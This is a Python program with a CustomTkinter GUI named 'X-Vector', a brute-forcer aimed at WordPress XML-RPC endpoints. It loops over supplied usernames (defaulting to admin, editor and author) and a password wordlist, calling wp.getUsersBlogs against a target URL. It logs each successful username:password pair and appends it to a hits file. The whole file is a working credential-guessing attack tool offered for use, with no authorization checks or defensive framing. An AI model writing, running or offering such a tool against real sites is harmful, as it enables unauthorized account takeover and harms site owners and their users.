import os
import json
import customtkinter as ctk
from tkinter import filedialog, messagebox
import xmlrpc.client
import threading
import time

# === Globals ===
log_file_path = "xvector_log.txt"
hits_file_path = "hits.txt"
abort_flag = False

# === Functions ===

def safe_log(message, status="info"):
    color = {"info": "white", "success": "green", "error": "red"}.get(status, "white")
    log_box.configure(state="normal")
    log_box.insert("end", message + "\n", (status,))
    log_box.tag_config(status, foreground=color)
    log_box.see("end")
    log_box.configure(state="disabled")
    try:
        with open(log_file_path, "a", encoding="utf-8") as f:
            f.write(message + "\n")
    except Exception as e:
        print(f"Logging error: {e}")

def clear_log():
    log_box.configure(state="normal")
    log_box.delete("1.0", "end")
    log_box.configure(state="disabled")
    try:
        open(log_file_path, "w").close()
    except:
        pass

def browse_wordlist():
    path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
    if path:
        wordlist_entry.delete(0, "end")
        wordlist_entry.insert(0, path)

def abort_attack():
    global abort_flag
    abort_flag = True
    safe_log("[*] Abort requested. Finishing current attempt...", "error")

def run_brute_force():
    global abort_flag
    abort_flag = False

    target = target_entry.get().strip()
    usernames = [u.strip() for u in usernames_box.get("1.0", "end").strip().splitlines()]
    wordlist_path = wordlist_entry.get().strip()

    if not target or not usernames or not wordlist_path:
        messagebox.showerror("Input Error", "Please fill in all fields.")
        return

    if not os.path.isfile(wordlist_path):
        messagebox.showerror("File Error", "Password wordlist file does not exist.")
        return

    clear_log()
    safe_log("[*] Starting brute-force attack...")

    try:
        with open(wordlist_path, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        messagebox.showerror("File Error", f"Could not read password file:\n{e}")
        return

    try:
        server = xmlrpc.client.ServerProxy(target)
        server.system.listMethods()  # test
    except Exception as e:
        safe_log(f"[!] Could not connect to {target}: {e}", "error")
        return

    total_attempts = len(usernames) * len(passwords)
    current_attempt = 0

    progress_bar.configure(maximum=total_attempts)
    progress_bar.set(0)

    for user in usernames:
        safe_log(f"\n[*] Trying username: {user}")
        for password in passwords:
            if abort_flag:
                safe_log("[!] Attack aborted by user.", "error")
                return
            success = False
            for attempt in range(3):  # Retry up to 3 times
                try:
                    resp = server.wp.getUsersBlogs(user, password)
                    if resp:
                        hit = f"[+] SUCCESS: {user}:{password}"
                        safe_log(hit, "success")
                        with open(hits_file_path, "a", encoding="utf-8") as f:
                            f.write(hit + "\n")
                        messagebox.showinfo("Password Found!", hit)
                        success = True
                        break
                except xmlrpc.client.Fault:
                    # Invalid credentials
                    break
                except Exception as e:
                    safe_log(f"[!] Network error, retrying ({attempt+1}/3): {e}", "error")
                    time.sleep(1)
            if success:
                break

            current_attempt += 1
            progress_bar.set(current_attempt)
            app.update_idletasks()

    safe_log("\n[*] Brute-force completed.")
    progress_bar.set(0)

def start_brute_force():
    threading.Thread(target=run_brute_force, daemon=True).start()

# === Setup CustomTkinter ===
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

app = ctk.CTk()
app.title("X-Vector | WP XML-RPC Brute Forcer Advanced")
app.geometry("750x780")
app.resizable(False, False)

# === Widgets ===
padding = {"padx": 10, "pady": 5}

ctk.CTkLabel(app, text="Target URL (e.g. https://example.com/xmlrpc.php)").pack(**padding)
target_entry = ctk.CTkEntry(app, width=700)
target_entry.pack(**padding)

ctk.CTkLabel(app, text="Usernames (one per line)").pack(**padding)
usernames_box = ctk.CTkTextbox(app, width=700, height=100)
usernames_box.pack(**padding)
usernames_box.insert("0.0", "admin\neditor\nauthor")

ctk.CTkLabel(app, text="Password Wordlist File").pack(**padding)
wordlist_frame = ctk.CTkFrame(app)
wordlist_frame.pack(**padding)
wordlist_entry = ctk.CTkEntry(wordlist_frame, width=500)
wordlist_entry.pack(side="left", padx=5)
ctk.CTkButton(wordlist_frame, text="Browse", command=browse_wordlist).pack(side="left", padx=5)

ctk.CTkLabel(app, text="Progress").pack(**padding)
progress_bar = ctk.CTkProgressBar(app, width=700)
progress_bar.pack(**padding)
progress_bar.set(0)

button_frame = ctk.CTkFrame(app)
button_frame.pack(pady=10)
ctk.CTkButton(button_frame, text="Start Brute Force", fg_color="green", hover_color="darkgreen", command=start_brute_force).pack(side="left", padx=10)
ctk.CTkButton(button_frame, text="Abort", fg_color="red", hover_color="darkred", command=abort_attack).pack(side="left", padx=10)
ctk.CTkButton(button_frame, text="Clear Log", fg_color="gray", hover_color="darkgray", command=clear_log).pack(side="left", padx=10)

ctk.CTkLabel(app, text="Output Log").pack(**padding)
log_box = ctk.CTkTextbox(app, height=350, width=700, state="disabled")
log_box.pack(**padding)

# === Start App ===
app.mainloop()
